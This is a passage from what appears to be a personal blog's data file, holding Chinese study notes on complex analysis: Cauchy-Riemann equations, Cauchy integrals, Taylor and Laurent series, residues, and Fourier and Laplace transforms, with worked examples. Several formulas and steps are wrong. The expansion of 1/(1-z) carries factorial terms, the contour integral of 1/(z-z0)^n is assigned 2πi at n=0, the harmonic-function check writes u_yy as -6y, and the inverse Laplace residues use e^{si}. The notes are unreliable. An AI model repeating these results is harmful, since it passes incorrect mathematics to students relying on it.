e^{-t},\\quad t > 0\n\\end{aligned}\n$$\n\n### 卷积\n\n### Laplace 变换的应用\n\n**例** 求解微分方程 $y''+\\omega^2y(t)=0, y(0)=0, y'(0)=\\omega$ 。\n\n**解** 令 $Y(s)=\\mathscr{L}[y(t)]$ ，对方程两边取 Laplace 变换，得\n$$\ns^2Y(s)-sy(0)-y'(0)+\\omega^2Y(s)=0\n$$\n代入初值条件，得\n$$\ns^2Y(s)-\\omega+\\omega^2Y(s)=0 \\\\\\\\\n\\Rightarrow Y(s)=\\frac{\\omega}{s^2+\\omega^2}\n$$\n求逆变换，得\n$$\n\\begin{aligned}\ny(t)=\\mathscr{L}^{-1}\\left[\\frac{\\omega}{s^2+\\omega^2}\\right] &= \\mathrm{Res}\\left[\\frac{we^{s\\mathrm{i}}}{s^2+w^2},w\\mathrm{i}\\right] + \\mathrm{Res}\\left[\\frac{we^{s\\mathrm{i}}}{s^2+w^2},-w\\mathrm{i}\\right] \\\\\\\\\n&= \\lim_{s\\to w\\mathrm{i}}\\frac{we^{s\\mathrm{i}}}{(s^2+w^2)'} + \\lim_{s\\to -w\\mathrm{i}}\\frac{we^{s\\mathrm{i}}}{(s^2+w^2)'} \\\\\\\\\n&=\\frac{we^w\\mathrm{i}t}{2w\\mathrm{i}}+\\frac{we^{-w\\mathrm{i}t}}{-2w\\mathrm{i}} \\\\\\\\\n&=\\frac{2\\mathrm{i}\\sin wt}{2\\mathrm{i}}=\\sin wt\n\\end{aligned}\n$$\n","slug":"复变函数笔记","published":1,"updated":"2023-03-23T11:23:10.885Z","_id":"cl915f8b70000do6ghiaeczan","comments":1,"layout":"post","photos":[],"content":"<p>高数写了笔记再考试效果挺好的 <del>（为什么挂科之前没这觉悟啊）</del>，复变也记一下吧。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"复数与复变函数\"><a href=\"#复数与复变函数\" class=\"headerlink\" title=\"复数与复变函数\"></a>复数与复变函数</h2><h3 id=\"复数及其运算\"><a href=\"#复数及其运算\" class=\"headerlink\" title=\"复数及其运算\"></a>复数及其运算</h3><p>通常记复数为 $z=x+\\mathrm{i}y$ ，其中实部与虚部记作<br>$$<br>x=\\mathrm{Re}(z),\\quad y=\\mathrm{Im}(z)<br>$$<br>显然<br>$$<br>\\mathrm{Re}(z)=\\frac{z+\\overline{z}}{2},\\quad \\mathrm{Im}(z)=\\frac{z-\\overline{z}}{2\\mathrm{i}}<br>$$<br>以正实轴为始边，以 $z(z\\neq 0)$ 所对应的向量为终边的角称为复数 $z$ 的辐角，记作 $\\mathrm{Arg}\\ z$ ，把在 $(-\\pi,\\pi]$ 之间的辐角称为 $z$ 的主辐角（或主值或者叫辐角主值），记作 $\\mathrm{arg}\\ z$ 。<br>有个重要点就是辐角要<strong>注意正负</strong>。</p>\n<p>以及大名鼎鼎的<strong>欧拉公式</strong>：$$e^{\\mathrm{i}\\theta}=\\cos\\theta+\\mathrm{i}\\sin\\theta$$</p>\n<p>一个没什么名但是<strong>很有用</strong>的公式——棣莫弗公式：$$z^n = \\cos n\\theta + \\mathrm{i}\\sin n\\theta$$</p>\n<p><strong>复数的开方</strong><br>复数开方时，开几次方就有几个结果。<br>求 $w=\\sqrt[n]{z}$ 时，令 $w=\\rho e^{\\mathrm{i}\\varphi}$ ，从而 $\\rho^n e^{\\mathrm{i}n\\varphi} = z = re^{\\mathrm{i}\\theta}$ ，得到<br>$$<br>\\rho^n = r,\\quad n\\varphi = \\theta + 2k\\pi,\\quad k=0,\\pm1,\\pm2,\\cdots<br>$$故<br>$$<br>\\rho = r^{1/n},\\quad \\varphi = \\frac{\\theta + 2k\\pi}{n}<br>$$于是<br>$$<br>w = \\sqrt[n]{r}e^{\\mathrm{i}\\frac{\\theta + 2k\\pi}{n}}<br>$$</p>\n<h3 id=\"平面点集的一般概念\"><a href=\"#平面点集的一般概念\" class=\"headerlink\" title=\"平面点集的一般概念\"></a>平面点集的一般概念</h3><p>和高数类似，没啥好说的。</p>\n<h3 id=\"复变函数\"><a href=\"#复变函数\" class=\"headerlink\" title=\"复变函数\"></a>复变函数</h3><p>似乎也没啥重要的（）</p>\n<h2 id=\"解析函数\"><a href=\"#解析函数\" class=\"headerlink\" title=\"解析函数\"></a>解析函数</h2><h3 id=\"解析函数的概念与柯西-黎曼方程\"><a href=\"#解析函数的概念与柯西-黎曼方程\" class=\"headerlink\" title=\"解析函数的概念与柯西-黎曼方程\"></a>解析函数的概念与柯西-黎曼方程</h3><p><strong>奇点</strong>：如果函数 $f(z)$ 在点 $z_0$ <strong>不解析</strong>，则称 $z_0$ 为 $f(z)$ 的奇点。<br>求<strong>有理分式</strong>的奇点时，直接取<strong>分母零点</strong>即可。</p>\n<p>柯西-黎曼方程（C-R方程）：<br>$$<br>\\frac{\\partial u}{\\partial x} = \\frac{\\partial v}{\\partial y},\\quad \\frac{\\partial u}{\\partial y} = -\\frac{\\partial v}{\\partial x}<br>$$</p>\n<p>可导的充要条件： $u(x,y)$ 和 $v(x,y)$ 在点 $x,y$ 可微，且在该点满足C-R方程。</p>\n<p><strong>例</strong> 证明：柯西-黎曼方程的极坐标形式是<br>$$<br>\\frac{\\partial u}{\\partial r} = \\frac{1}{r}\\frac{\\partial v}{\\partial \\theta},\\quad \\frac{\\partial v}{\\partial r} = -\\frac{1}{r}\\frac{\\partial r}{\\partial \\theta}<br>$$</p>\n<h3 id=\"初等函数及其解析性\"><a href=\"#初等函数及其解析性\" class=\"headerlink\" title=\"初等函数及其解析性\"></a>初等函数及其解析性</h3><p><strong>指数函数</strong> $z=x+\\mathrm{i}y$ 为任意复数，称 $w=e^z=e^x(\\cos y+\\mathrm{i}\\sin y)$ 为指数函数。</p>\n<p><strong>对数函数</strong> 满足方程 $e^w = z$ 的函数 $w=\\mathrm{Ln} \\ z$ 称为对数函数，且<br>$$<br>\\mathrm{Ln}\\ z = \\ln z + 2k\\pi\\mathrm{i} = \\ln|z| + \\mathrm{i}\\mathrm{arg}\\ z + 2k\\pi\\mathrm{i},\\quad k=0,\\pm1,\\pm2,\\cdots<br>$$</p>\n<p><strong>幂函数</strong> $w=z^a=e^{a\\mathrm{Ln}\\ z}$ 为幂函数。</p>\n<p><strong>三角函数</strong> 称 $\\sin z = \\frac{e^{\\mathrm{i}z}-e^{-\\mathrm{i}z}}{2\\mathrm{i}}$ 为正弦函数， $\\cos z = \\frac{e^{\\mathrm{i}z}+e^{-\\mathrm{i}z}}{2}$ 为余弦函数。</p>\n<p><strong>双曲函数</strong> 称 $\\sinh z = \\frac{e^z-e^{-z}}{2}$ 为双曲正弦函数， $\\cosh z = \\frac{e^z+e^{-z}}{2}$ 为双曲余弦函数。</p>\n<h3 id=\"解析函数与调和函数的关系\"><a href=\"#解析函数与调和函数的关系\" class=\"headerlink\" title=\"解析函数与调和函数的关系\"></a>解析函数与调和函数的关系</h3><p>若实二元函数 $\\varphi(x,y)$ 在区域 $D$ 内具有二阶连续偏导数，且满足 $\\mathrm{Laplace}$ 方程<br>$$<br>\\frac{\\partial^2\\varphi}{\\partial x^2} + \\frac{\\partial^2\\varphi}{\\partial y^2} = 0<br>$$<br>则称 $\\varphi(x,y)$ 为区域 $D$ 的调和函数。</p>\n<p><strong>例</strong> 验证 $u(x,y)=x^3-3xy^2$ 为调和函数，并求以 $u(x,y)$ 为实部的解析函数 $f(z)$ ，使得 $f(\\mathrm{i}) = -\\mathrm{i}$ 。</p>\n<p><strong>解</strong> $u_{xx}=6x$，$u_{yy}=-6y$，故 $u_{xx}+u_{yy}=0$， $u(x,y)$ 为调和函数。下面求虚部 $v(x,y)$ 。<br><strong>法一</strong>：偏积分法<br>$$<br>u_x = 3x^2-3y^2 = v_y \\Rightarrow v = \\int (3x^2-3y^2)\\mathrm{d}y = 3x^2y-y^3 + \\varphi(x) \\\\<br>v_x = 6xy+\\varphi’(x) = -u_y = 6xy \\Rightarrow \\varphi(x) = C \\Rightarrow v(x,y) = 3x^2y - y^3 + C<br>$$</p>\n<p><strong>法二</strong>：全微分法<br>$$<br>v_y=u_x=3x^2-3y^2,v_x=-u_y=6xy\\\\<br>\\Rightarrow \\mathrm{d}v = v_x’\\mathrm{d}x +v_y’\\mathrm{d}y=6xy\\mathrm{d}x + (3x^2-3y^2)\\mathrm{d}y\\\\<br>\\Rightarrow v(x,y)=\\int_{(0,0)}^{(x,y)}6xy\\mathrm{d}x+(3x^2-3y^2)\\mathrm{d}y + C \\\\<br>=\\int_0^x\\mathrm{d}x+\\int_0^y(3x^2-3y^2)\\mathrm{d}y + C = 3x^2y - y^3 + C<br>$$</p>\n<p>最后代入 $f(\\mathrm{i})=-\\mathrm{i}$ 有 $f(z)=(x^3-3xy^2)+\\mathrm{i}(3x^2y-y^3)=z^3$ 。</p>\n<h2 id=\"复变函数的积分\"><a href=\"#复变函数的积分\" class=\"headerlink\" title=\"复变函数的积分\"></a>复变函数的积分</h2><h3 id=\"复变函数积分的概念\"><a href=\"#复变函数积分的概念\" class=\"headerlink\" title=\"复变函数积分的概念\"></a>复变函数积分的概念</h3><p><strong>例</strong> 计算 $I=\\oint_{\\mathit{\\Gamma}}\\frac{1}{(z-z_0)^n}\\mathrm{d}z$ ，其中 $\\mathit{\\Gamma}$ 为包含 $z_0$ 的一条闭曲线。<br><strong>解</strong> 以 $z_0$ 为圆心 $r$ 为半径作圆，则函数 $f(z)=\\frac{1}{(z-z_0)^n}$ 在 $\\overline{D}=D+\\mathit{\\Gamma}+C^-$上解析，因此<br>$$<br>I = \\oint_C\\frac{\\mathrm{d}z}{(z-z_0)^n}\\mathrm{d}z<br>= \\begin{cases}<br>2\\pi\\mathrm{i}, &amp; n = 0 \\\\<br>0, &amp; n\\neq0<br>\\end{cases}<br>$$</p>\n<h3 id=\"柯西积分定理\"><a href=\"#柯西积分定理\" class=\"headerlink\" title=\"柯西积分定理\"></a>柯西积分定理</h3><p>设函数 $f(z)$ 在单连通域 $D$ 内解析， $\\mathit{\\Gamma}$ 为 $D$ 内的任意一条简单闭曲线，则有$$\\oint_{\\mathit{\\Gamma}}f(z)\\mathrm{d}z=0$$<br>甚至也不用在$ \\mathit{\\Gamma}$ 上解析，在 $\\mathit{\\Gamma}$ 上连续就成立。</p>\n<h3 id=\"复合闭路定理\"><a href=\"#复合闭路定理\" class=\"headerlink\" title=\"复合闭路定理\"></a>复合闭路定理</h3><p>设多连域 $D$ 的边界为 $C=C_0 + C_1^- + C_2^- + \\cdots + C_n^-$ ，函数 $f(z)$ 在 $D$ 内解析，在 $C$ 上连续，则<br>$$<br>\\oint_Cf(z)\\mathrm{d}z = 0<br>$$<br>或<br>$$<br>\\oint_{C_0}f(z)\\mathrm{d}z = \\sum_{k=1}^n\\oint_{C_k}f(z)\\mathrm{d}z<br>$$</p>\n<h3 id=\"柯西积分公式\"><a href=\"#柯西积分公式\" class=\"headerlink\" title=\"柯西积分公式\"></a>柯西积分公式</h3><p><strong>柯西积分公式</strong> 若函数 $f(z)$ 在简单正向闭曲线 $C$ 所围成的区域 $D$ 内解析，在区域 $D$ 的边界 $C$ 上连续， $z_0$ 是区域 $D$ 内任意一点，则<br>$$<br>f(z_0) = \\frac{1}{2\\pi\\mathrm{i}}\\oint_C\\frac{f(z)}{z-z_0}\\mathrm{d}z<br>$$</p>\n<p><strong>高阶求导公式</strong> 设 $f(z)$ 在 $D$ 内解析，在 $D$ 的边界 $C$ 上连续， $C$ 为正向简单闭曲线，则 $f^{(n)}(z)$ 在 $D$ 内解析，且有<br>$$<br>f^{(n)}(z_0)=\\frac{n!}{2\\pi\\mathrm{i}}\\oint_C\\frac{f(z)}{(z-z_0)^{n+1}}\\mathrm{d}z, \\quad \\forall z_0\\in D, n=0,1,2,\\cdots<br>$$</p>\n<h2 id=\"解析函数的幂级数表示\"><a href=\"#解析函数的幂级数表示\" class=\"headerlink\" title=\"解析函数的幂级数表示\"></a>解析函数的幂级数表示</h2><h3 id=\"复级数的基本概念\"><a href=\"#复级数的基本概念\" class=\"headerlink\" title=\"复级数的基本概念\"></a>复级数的基本概念</h3><p>复数列收敛和一般的数列收敛定义类似，其充要条件为<br>$$<br>\\lim_{n\\to\\infty}a_n=a,\\quad \\lim_{n\\to\\infty}b_n=b<br>$$<br>所以判断级数收不收敛就<strong>拆成实部和虚部</strong>然后进行判断。</p>\n<h3 id=\"幂级数\"><a href=\"#幂级数\" class=\"headerlink\" title=\"幂级数\"></a>幂级数</h3><p><strong>收敛半径</strong> 求法与高数类似，但多个根值法：<br>（1）（比值法） $\\lim\\limits_{n\\to\\infty}\\left|\\frac{a_{n+1}}{a_n}\\right|=L$<br>（2）（根值法） $\\lim\\limits_{n\\to\\infty}\\sqrt[n]{|a_n|}=L$<br>则收敛半径 $R=\\frac{1}{L}$</p>\n<p>幂级数性质与高数也类似，可以逐项求导和逐项求积。</p>\n<h3 id=\"解析函数的泰勒展开\"><a href=\"#解析函数的泰勒展开\" class=\"headerlink\" title=\"解析函数的泰勒展开\"></a>解析函数的泰勒展开</h3><p>与高数类似，不再赘述。</p>\n<p><strong>四个重要的已知展开</strong><br>$$<br>\\frac{1}{1-z} = \\sum_{n=0}^\\infty z^n = 1+z+\\frac{z^2}{2}+\\frac{z^3}{3!}+\\cdots,\\enspace |z| &lt; 1 \\\\<br>e^z = \\sum_{n=0}^\\infty \\frac{z^n}{n!} = 1+z+\\frac{z^2}{2!}+\\frac{z^3}{3!}+\\cdots,\\enspace |z| &lt; +\\infty \\\\<br>\\sin z = \\sum_{n=0}^\\infty \\frac{(-1)^nz^{2n+1}}{(2n+1)!} = z-\\frac{z^3}{3!}+\\frac{z^5}{5!}-\\frac{z^7}{7!}+\\cdots,\\enspace |z| &lt; +\\infty \\\\<br>\\cos z = \\sum_{n=0}^\\infty \\frac{(-1)^nz^{2n}}{(2n)!} = 1-\\frac{z^2}{2!}+\\frac{z^4}{4!}-\\frac{z^6}{6!}+\\cdots,\\enspace |z| &lt; +\\infty<br>$$</p>\n<p><strong>展开后注意标出收敛圆！</strong></p>\n<h3 id=\"洛朗级数\"><a href=\"#洛朗级数\" class=\"headerlink\" title=\"洛朗级数\"></a>洛朗级数</h3><p>泰勒展开有个缺陷，那就是只能展开到解析的地方，如果中间有个奇点卡住，那就不能再往外展开了。<br>这个时候就用到洛朗级数，可以在圆环域展开，弥补泰勒展开的不足。</p>\n<h2 id=\"留数及其应用\"><a href=\"#留数及其应用\" class=\"headerlink\" title=\"留数及其应用\"></a>留数及其应用</h2><h3 id=\"孤立奇点\"><a href=\"#孤立奇点\" class=\"headerlink\" title=\"孤立奇点\"></a>孤立奇点</h3><h4 id=\"零点的判断\"><a href=\"#零点的判断\" class=\"headerlink\" title=\"零点的判断\"></a>零点的判断</h4><p>首先很直白的， $f(z_0)=0$ ，那么 $z=z_0$ 就是 $f(z)$ 的零点。<br>若 $f(z)=(z-z_0)^m\\varphi(z)$ ， $\\varphi(z)$ 在 $z_0$ 处解析且 $\\varphi(z_0)\\neq 0$ ，则 $z=z_0$ 是 $f(z)$ 的 $m$ 阶零点。</p>\n<h4 id=\"奇点类型的判断\"><a href=\"#奇点类型的判断\" class=\"headerlink\" title=\"奇点类型的判断\"></a>奇点类型的判断</h4><p>从定义上判断的话就先展开成洛朗级数，即设 $z_0$ 为 $f(z)$ 的孤立奇点，将 $f(z)$ 在 $0 &lt; |z-Z_0| &lt; \\delta$ 内洛朗展开为 $f(z)=\\sum\\limits_{n=0}^{+\\infty} a_n(z-z_0)^n$ 。</p>\n<ol>\n<li>可去奇点：展开式中不含负幂次项，直观上看就是 $\\lim\\limits_{z\\to z_0}f(z)=C$ 。</li>\n<li>$N$ 阶极点：含有限多的负幂次项，且最高负幂次为 $N$ ，直观上看就是 $\\lim\\limits_{z\\to z_0}f(z)=\\infty$。</li>\n<li>本性奇点：含无穷多的负幂次项，直观上看就是 $\\lim\\limits_{z\\to z_0}f(z)$ 不存在且不为 $\\infty$ 。</li>\n</ol>\n<h3 id=\"留数\"><a href=\"#留数\" class=\"headerlink\" title=\"留数\"></a>留数</h3><h4 id=\"留数的定义\"><a href=\"#留数的定义\" class=\"headerlink\" title=\"留数的定义\"></a>留数的定义</h4><p>设 $z_0$ 为函数 $f(z)$ 的孤立奇点，将 $f(z)$ 在 $z_0$ 的去心邻域内展开成洛朗级数<br>$$<br>f(z) = \\sum_{n=-\\infty}^{+\\infty}a_n(z-z_0)^n = \\cdots + a_{-2}(z-z_0)^{-2} + a_{-1}(z-z_0)^{-1} + a_0 + a_1(z-z_0) + a_2(z-z_0)^2 + \\cdots<br>$$<br>称 $a_{-1}$ 为 $f(z)$ 在 $z_0$ 处的留数，记作$$\\mathrm{Res}[f(z),z_0]=a_{-1}=\\frac{1}{2\\pi i}\\oint\\limits_c f(z)\\mathrm{d}z$$<br>其中 $C$ 是 $z_0$ 的去心邻域内绕 $z_0$ 的一条简单闭曲线。</p>\n<h4 id=\"留数的求解\"><a href=\"#留数的求解\" class=\"headerlink\" title=\"留数的求解\"></a>留数的求解</h4><ol>\n<li>$z_0$ 为可去奇点： $\\mathrm{Res}[f(z),z_0]=0$ 。</li>\n<li>$z_0$ 为本性奇点：需要将$f(z)$在$z_0$的去心邻域内展开成洛朗级数</li>\n<li>$z_0$ 为 $m$ 阶极点：$$\\mathrm{Res}[f(z),z_0]=\\frac{1}{(m-1)!}\\lim_{z\\to z_0}\\frac{d^{m-1}}{dz^{m-1}}[(z-z_0)^mf(z)]$$</li>\n</ol>\n<h4 id=\"无穷远处的留数\"><a href=\"#无穷远处的留数\" class=\"headerlink\" title=\"无穷远处的留数\"></a>无穷远处的留数</h4><p>若函数 $f(z)$ 在无穷远点 $\\infty$ 的去心领域 $R&lt;|f(z)|&lt;+\\infty$ 内解析，则称点 $\\infty$ 为 $f(z)$ 的孤立奇点。</p>\n<p>设函数 $f(z)$ 在圆环域 $R&lt;|z|&lt;+\\infty$ 内解析，则 $f(z)$ 在 $\\infty$ 处的留数为：<br>$$<br>\\mathrm{Res}[f(z),\\infty]=\\frac{1}{2\\pi \\mathrm{i}}\\oint_{C^-}f(z)\\mathrm{d}z<br>$$<br>其中， $C$ 为 $|z|=\\rho &gt; R$ 。</p>\n<p>$$<br>\\mathrm{Res}[f(z), \\infty] = -\\mathrm{Res}[f(\\frac{1}{z})\\cdot\\frac{1}{z^2}, 0]<br>$$</p>\n<h3 id=\"利用留数计算实积分\"><a href=\"#利用留数计算实积分\" class=\"headerlink\" title=\"利用留数计算实积分\"></a>利用留数计算实积分</h3><h4 id=\"形如-int-0-2-pi-R-cos-theta-sin-theta-mathrm-d-theta-的积分\"><a href=\"#形如-int-0-2-pi-R-cos-theta-sin-theta-mathrm-d-theta-的积分\" class=\"headerlink\" title=\"形如 $\\int_0^{2\\pi}R(\\cos\\theta,\\sin\\theta)\\mathrm{d}\\theta$ 的积分\"></a>形如 $\\int_0^{2\\pi}R(\\cos\\theta,\\sin\\theta)\\mathrm{d}\\theta$ 的积分</h4><p><strong>计算方法</strong>：</p>\n<ol>\n<li>令 $z=e^{\\mathrm{i}\\theta}=\\cos\\theta+\\mathrm{i}\\sin\\theta$ ，则 $\\mathrm{d}\\theta=\\frac{\\mathrm{d}z}{\\mathrm{i}z}$ ， $\\cos\\theta=\\frac{z^2+1}{2z}$ ， $\\sin\\theta=\\frac{z^2-1}{2\\mathrm{i}z}$ 。</li>\n<li>$\\int_0^{2\\pi}R(\\cos\\theta,\\sin\\theta)\\mathrm{d}\\theta=\\oint_{|z|=1}R\\left(\\frac{z^2+1}{2z},\\frac{z^2-1}{2\\mathrm{i}z}\\right)\\frac{1}{\\mathrm{i}z}\\mathrm{d}z=\\oint_{|z|=1}f(z)\\mathrm{d}z=2\\pi\\mathrm{i}\\sum\\limits_k \\mathrm{Res}[f(z),z_k]$ ，其中 $z_k$ 是 $f(z)$ <strong>在 $|z|=1$ 内</strong>的孤立奇点。</li>\n</ol>\n<h4 id=\"形如-int-infty-infty-R-x-mathrm-d-x-的积分\"><a href=\"#形如-int-infty-infty-R-x-mathrm-d-x-的积分\" class=\"headerlink\" title=\"形如 $\\int^{+\\infty}_{-\\infty}R(x)\\mathrm{d}x$ 的积分\"></a>形如 $\\int^{+\\infty}_{-\\infty}R(x)\\mathrm{d}x$ 的积分</h4><p><strong>要求</strong>：</p>\n<ol>\n<li>$R(x)=\\frac{P(x)}{Q(x)}$ ，其中 $P(x)$ 和 $Q(x)$ 为多项式，且 $Q(x)$ 无<strong>实零点</strong>。</li>\n<li>分母 $Q(x)$ 的次数比分子 $P(x)$ 的次数高 $2$ 或以上。</li>\n</ol>\n<p><strong>计算方法</strong>： $\\int^{+\\infty}_{-\\infty}R(x)\\mathrm{d}x=2\\pi\\mathrm{i}\\sum\\limits_k\\mathrm{Res}[R(z),z_k]$ ， 其中 $z_k$ 为 $R(z)$在<strong>上半平面</strong>内的孤立奇点。</p>\n<p><strong>例</strong> 求积分 $I=\\int_{-\\infty}^{+\\infty}\\frac{x^2-x+2}{x^4+10x^2+9}\\mathrm{d}x$ .<br><strong>解</strong> 首先显然分母零点均为虚数，且分母次数比分子高 $2$ ，故满足条件。</p>\n<ol>\n<li>令 $$R(z)=\\frac{z^2-z+2}{z^4+10z^2+9}=\\frac{z^2-z+2}{(z^2+1)(z^2+9)}$$<br>则上半平面内有一阶极点 $z_1=\\mathrm{i}$ 和 $z_2=3\\mathrm{i}$ 。</li>\n<li>则<br>$$<br>\\begin{aligned}<br>I&amp;=\\int_{-\\infty}^{+\\infty}\\frac{x^2-x+2}{x^4+10x^2+9}\\mathrm{d}x\\\\<br>&amp;=2\\pi\\mathrm{i}\\sum\\limits_k\\mathrm{Res}[R(z),z_k] \\\\<br>&amp;=2\\pi\\mathrm{i}\\left(\\mathrm{Res}[R(z),\\mathrm{i}]+\\mathrm{Res}[R(z),3\\mathrm{i}]\\right)\\\\<br>&amp;=2\\pi\\mathrm{i}\\left(-\\frac{1+\\mathrm{i}}{16}+\\frac{3-7\\mathrm{i}}{48}\\right) = \\frac{5\\pi}{12}<br>\\end{aligned}<br>$$</li>\n</ol>\n<h4 id=\"形如-int-infty-infty-R-x-e-mathrm-i-ax-mathrm-d-x-a-gt-0-的积分\"><a href=\"#形如-int-infty-infty-R-x-e-mathrm-i-ax-mathrm-d-x-a-gt-0-的积分\" class=\"headerlink\" title=\"形如 $\\int^{+\\infty}_{-\\infty}R(x)e^{\\mathrm{i}ax}\\mathrm{d}x(a&gt;0)$ 的积分\"></a>形如 $\\int^{+\\infty}_{-\\infty}R(x)e^{\\mathrm{i}ax}\\mathrm{d}x(a&gt;0)$ 的积分</h4><p><strong>要求</strong>：</p>\n<ol>\n<li>$R(x)=\\frac{P(x)}{Q(x)}$ ，其中 $P(x)$ 和 $Q(x)$ 为多项式，且 $Q(x)$ 无<strong>实零点</strong>。</li>\n<li>分母 $Q(x)$ 的次数比分子 $P(x)$ 的次数高 $1$ 或以上。</li>\n</ol>\n<p><strong>计算方法</strong>： $\\int^{+\\infty}_{-\\infty}R(x)e^{\\mathrm{i}ax}\\mathrm{d}x=2\\pi\\mathrm{i}\\sum\\limits_k\\mathrm{Res}[R(z)e^{\\mathrm{i}az},z_k]$ ， 其中 $z_k$ 为 $R(z)$在<strong>上半平面</strong>内的孤立奇点。</p>\n<h2 id=\"Fourier变换\"><a href=\"#Fourier变换\" class=\"headerlink\" title=\"Fourier变换\"></a>Fourier变换</h2><p>记得上一年的这个时候就对傅里叶变换有所接触了，然而时光荏苒，却一直没能有什么更深的理解，有些惭愧了。</p>\n<h3 id=\"Fourier-积分公式\"><a href=\"#Fourier-积分公式\" class=\"headerlink\" title=\"Fourier 积分公式\"></a>Fourier 积分公式</h3><p>$$<br>f(t) = \\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}\\left[\\int_{-\\infty}^{+\\infty}f(t)e^{-\\mathrm{i}\\omega t} \\mathrm{d}t\\right]e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega<br>$$<br>这个式子有点奇怪，两边都有 $f(t)$ ，那我要来干嘛呢，这时你先别急，下面拆解一下就有意思了。</p>\n<h3 id=\"Fourier-变换\"><a href=\"#Fourier-变换\" class=\"headerlink\" title=\"Fourier 变换\"></a>Fourier 变换</h3><p>上式中令 $F(\\omega)=\\int_{-\\infty}^{+\\infty}f(t)e^{-\\mathrm{i}\\omega t} \\mathrm{d}t$ ，则 $f(t)=\\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}F(\\omega)e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega$ ，那么这个关于 $\\omega$ 的函数 $F(\\omega)$ 就是 $f(t)$ 的傅里叶变换。<br>这样一来就可以粗略地理解为傅里叶变换就是把<strong>关于时间的函数</strong>转换为<strong>关于频率的函数</strong>，也就是所谓的时域转换为频域。</p>\n<p><strong>例</strong> 求矩形脉冲函数 $f(t)=\\begin{cases}1, &amp; |t|\\leq a\\\\0, &amp; |t|&gt; a\\end{cases}$ 的傅里叶变换及傅里叶积分表达式。</p>\n<p><strong>解</strong> 经典例题<br>$$<br>\\begin{aligned}<br>F(\\omega)=\\mathscr{F}[f(t)]&amp;=\\int_{-\\infty}^{+\\infty}f(t)e^{-\\mathrm{i}\\omega t} \\mathrm{d}t\\\\<br>&amp;=\\int_{-a}^{a}e^{-\\mathrm{i}\\omega t} \\mathrm{d}t\\\\<br>&amp;=\\frac{1}{-\\mathrm{i}\\omega}\\left(e^{-\\mathrm{i}\\omega a}-e^{\\mathrm{i}\\omega a}\\right)\\\\<br>&amp;=\\frac{2}{\\omega}\\cdot\\frac{e^{-\\mathrm{i}\\omega a}-e^{\\mathrm{i}\\omega a}}{-2\\mathrm{i}} \\\\<br>&amp;= \\frac{2}{\\omega}\\cdot\\sin a\\omega<br>\\end{aligned}<br>$$<br>再作傅里叶逆变换，即得傅里叶积分表达式<br>$$<br>\\begin{aligned}<br>f(t)=\\mathscr{F}^{-1}[F(\\omega)]&amp;=\\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}\\frac{2\\sin a\\omega}{\\omega}e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega\\\\<br>&amp;=\\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}\\frac{2\\sin a\\omega}{\\omega}\\cos\\omega t \\mathrm{d}\\omega + \\frac{\\mathrm{i}}{2\\pi}\\int_{-\\infty}^{+\\infty}\\frac{2\\sin a\\omega}{\\omega}\\sin\\omega t \\mathrm{d}\\omega\\\\<br>&amp;=\\frac{1}{\\pi}\\int_{-\\infty}^{+\\infty}\\frac{\\sin a\\omega}{\\omega}\\cos\\omega t \\mathrm{d}\\omega \\\\<br>&amp;=\\begin{cases}1, &amp; |t| &lt; a \\\\ 1/2, &amp; |t| = a \\\\ 0, &amp; |t| &gt; a\\end{cases}<br>\\end{aligned}<br>$$<br>上式中令 $t=0$ ，可得重要积分公式<br>$$<br>\\int_{-\\infty}^{+\\infty}\\frac{\\sin ax}{x} \\mathrm{d}x=\\pi,\\quad (a&gt;0)<br>$$</p>\n<h3 id=\"delta-函数及其-Fourier-变换\"><a href=\"#delta-函数及其-Fourier-变换\" class=\"headerlink\" title=\"$\\delta$ 函数及其 Fourier 变换\"></a>$\\delta$ 函数及其 Fourier 变换</h3><p>我们称满足如下条件的函数为 $\\delta$ 函数：</p>\n<ol>\n<li>当 $t \\neq0$ 时， $\\delta(t)=0$ ；</li>\n<li>$\\int_{-\\infty}^{+\\infty}\\delta(t)\\mathrm{d}t = 1$<br>可以看出，这是一个直观上矛盾的函数。书本上也说明了它不是一个经典意义上的函数，而是一个<strong>广义函数</strong>，有兴趣可以另行搜索。</li>\n</ol>\n<p>$\\delta$ 函数有一个性质，就是对任意的连续函数 $f(t)$ ，都有<br>$$<br>\\int_{-\\infty}^{+\\infty}f(t)\\delta(t)\\mathrm{d}t = f(0)<br>$$更一般地，若 $f(t)$ 在 $t=t_0$ 处连续，则<br>$$<br>\\int_{-\\infty}^{+\\infty}f(t)\\delta(t-t_0)\\mathrm{d}t = f(t_0)<br>$$</p>\n<p>这是一个很好的<strong>筛选性质</strong>。同时其傅里叶变换也很有意思：<br>$$<br>F(\\omega) = \\mathscr{F}[\\delta(t)] = \\int_{-\\infty}^{+\\infty}\\delta(t)e^{-\\mathrm{i}\\omega t}\\mathrm{d}t = e^{-\\mathrm{i}\\omega t}|_{t=0} = 1 \\\\<br>\\delta(t) = \\mathscr{F}^{-1}[1] = \\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega<br>$$</p>\n<h3 id=\"Fourier-变换的性质\"><a href=\"#Fourier-变换的性质\" class=\"headerlink\" title=\"Fourier 变换的性质\"></a>Fourier 变换的性质</h3><h3 id=\"Fourier-变换的卷积性质\"><a href=\"#Fourier-变换的卷积性质\" class=\"headerlink\" title=\"Fourier 变换的卷积性质\"></a>Fourier 变换的卷积性质</h3><p>简单来说，就是<br>$$<br>f_1(t)*f_2(t) = \\int_{-\\infty}^{+\\infty}f_1(\\tau)f_2(t-\\tau)\\mathrm{d}\\tau<br>$$</p>\n<h2 id=\"Laplace-变换\"><a href=\"#Laplace-变换\" class=\"headerlink\" title=\"Laplace 变换\"></a>Laplace 变换</h2><h3 id=\"Laplace-变换的概念\"><a href=\"#Laplace-变换的概念\" class=\"headerlink\" title=\"Laplace 变换的概念\"></a>Laplace 变换的概念</h3><p><strong>例</strong> 求指数函数 $f(t)=e^{kt} ,k \\in \\mathbb{R}$ 的 Laplace 变换。<br><strong>解</strong> 